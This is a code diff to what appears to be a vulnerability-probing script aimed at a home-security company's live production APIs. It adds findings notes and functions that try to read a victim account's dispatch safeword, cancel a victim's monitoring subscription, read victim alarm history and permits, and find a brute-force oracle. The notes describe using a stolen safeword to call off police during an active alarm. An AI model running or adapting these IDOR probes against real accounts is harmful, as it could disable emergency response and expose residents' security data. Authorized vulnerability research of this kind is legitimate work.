@@ -51,6 +51,8 @@ SERVICES = {
     "address_validation":   "https://address-validation.prd.platform.simplisafe.com",
     "sscr":                 "https://sscr.prd.platform.simplisafe.com",
     "otel_collector":       "https://otel-collector-bridge.services.simplisafe.com",
+    "gateway":              "https://api.services.simplisafe.com",
+    "app_comm":             "https://api.services.simplisafe.com/app-communications",
 }
 
 AUTH0_CLIENT_ID = "DojdcaKF6ZzC80TpIBcx4que1JD7suFp"
@@ -135,14 +137,15 @@ FINDINGS = [
             verified=True,
             evidence='200 Prometheus text; pod="mediator-5669b6bff6-x6bqp", namespace="mediator", '
                      '7 active TCP sockets (live camera streams), 221MB resident. No auth.'),
-    Finding("F22", "LOW",     "Git Commit Hash in Server Header — Systemic (3 services)",
+    Finding("F22", "LOW",     "Git Commit Hash in Server Header — Systemic (5 services)",
             "location_auth", "/locations/x", "GET", None,
             verified=True,
             evidence='location-grant-authorizations/0.1.0+b026ae7; '
                      'ss-address-validation/0.1.0+d023296; '
-                     'ss-change-requests/0.1.0+bd49a7c (sscr.prd.platform). '
-                     'All 3 also leak traceresponse header to external clients on every response. '
-                     'Systemic: shared framework template misconfiguration.'),
+                     'ss-change-requests/0.1.0+bd49a7c; '
+                     'preactivations/0.1.0+95a80a0 (api.services.simplisafe.com); '
+                     'app-communications-service/0.1.0+18be8c7 (api.services.simplisafe.com/app-communications). '
+                     'All 5 also leak traceresponse on every response. Systemic.'),
     Finding("F23", "MEDIUM",  "Unauthenticated OTel Full-Signal Injection (traces/logs/metrics)",
             "otel_collector", "/v1/traces|/v1/logs|/v1/metrics", "POST", None,
             verified=True,
@@ -160,6 +163,27 @@ FINDINGS = [
                      '10 new IDOR endpoints not in APK RE: DELETE /cameras/{uuid}, '
                      'DELETE /recordings/{clipId}, POST /subscriptions/{sid}/cancellations, '
                      'POST /ss3/{serial}/ota-requests, PATCH /cameras/{uuid}/settings.'),
+    Finding("F25", "CRITICAL", "Safeword Exposure via Preactivation IDOR (candidate)",
+            "gateway", "/v1/preactivations/preactivations/account/{accountId}", "GET", None,
+            verified=False,
+            notes='APK: GatewayRestService.java classes14.dex. '
+                  'Preactivation response includes monitoringLocation.dispatcherInfo.safeword. '
+                  'Safeword = verbal password to monitoring center to cancel police dispatch. '
+                  'If accountId not validated against JWT -> attacker reads victim safeword -> '
+                  'calls monitoring center during active alarm -> cancels emergency response. '
+                  'Also: POST monitoring/v1/locations/validations/safeword = brute-force oracle '
+                  'if no rate limiting. Test: GET /v1/preactivations/preactivations/account/{victim_accountId} '
+                  'with own token; 200 with safeword populated = CRITICAL confirmed.'),
+    Finding("F26", "MEDIUM",  "Hidden Monitoring API Surface Not in Swagger Spec",
+            "app_hub", "/monitoring/v1/locations/{locationId}/*", "GET", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java. 13+ monitoring endpoints absent from /v1/swagger spec: '
+                  'GET /monitoring/v1/locations/{id}/alarms, /alarms/latest, /permits; '
+                  'GET /monitoring/v2/locations/{id}/features; '
+                  'POST .../alarms/{alarmId}/actions (dismiss), .../permits/{type}; '
+                  'POST monitoring/v1/locations/validations/safeword (oracle); '
+                  'All 401 without token — IDOR pending auth test. '
+                  'If locationId not cross-validated: alarm history read, permit manipulation, alarm dismiss.'),
 ]
 
 
@@ -371,6 +395,63 @@ def probe_unauth():
 
     # F24: App-hub Swagger + spec exposure
     probe_apphub_swagger()
+
+
+def test_safeword_idor(token, victim_account_id):
+    """F25: Safeword exposure via preactivation accountId IDOR."""
+    print(f"\n=== F25 — Safeword IDOR (victim_account_id={victim_account_id}) ===")
+    url = f"{SERVICES['gateway']}/v1/preactivations/preactivations/account/{victim_account_id}"
+    r = get(url, token=token)
+    if not r:
+        print("  Request failed")
+        return
+    if r.status_code == 200:
+        try:
+            d = r.json()
+            preactivations = d.get("preactivations", [])
+            for p in preactivations:
+                monitoring = p.get("monitoringLocation", {})
+                dispatcher = monitoring.get("dispatcherInfo", {})
+                safeword = dispatcher.get("safeword")
+                if safeword:
+                    _print("CRIT", 200,
+                           f"SAFEWORD EXPOSED for account {victim_account_id}: '{safeword}'")
+                else:
+                    _print("INFO", 200, f"Response OK but no safeword field: {str(dispatcher)[:80]}")
+        except Exception as e:
+            _print("INFO", 200, f"Response parse error: {e}")
+    else:
+        _print("INFO", r.status_code, f"preactivations/{victim_account_id}: {r.text[:100]}")
+
+
+def test_cancel_subscription_idor(token, victim_sid):
+    """F-cancel: Cancel victim's monitoring subscription (IDOR if sid not validated)."""
+    print(f"\n=== Cancel Subscription IDOR (victim_sid={victim_sid}) ===")
+    confirm = input(f"  Attempt subscription cancellation on victim_sid={victim_sid}? [y/N] ").strip().lower()
+    if confirm != "y":
+        print("  Skipped.")
+        return
+    r = post(f"{SERVICES['app_hub']}/v1/subscriptions/{victim_sid}/cancellations",
+             token=token, body={"cancellationReason": "OTHER"})
+    if r:
+        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
+               f"cancel sub {victim_sid}  {r.text[:100]}")
+
+
+def test_monitoring_idor(token, victim_location_id):
+    """F26: Hidden monitoring endpoints — IDOR test against victim locationId."""
+    print(f"\n=== F26 — Monitoring IDOR (victim_location_id={victim_location_id}) ===")
+    base = SERVICES["app_hub"]
+    for path, label in [
+        (f"/monitoring/v1/locations/{victim_location_id}/alarms", "alarm history"),
+        (f"/monitoring/v1/locations/{victim_location_id}/alarms/latest", "latest alarm"),
+        (f"/monitoring/v1/locations/{victim_location_id}/permits", "permits"),
+        (f"/monitoring/v2/locations/{victim_location_id}/features", "features"),
+    ]:
+        r = get(base + path, token=token)
+        if r:
+            sev = "CRIT" if r.status_code == 200 else "INFO"
+            _print(sev, r.status_code, f"{label}  {r.text[:100]}")
 
 
 # ─── IDOR Test Suite ────────────────────────────────────────────────────────────
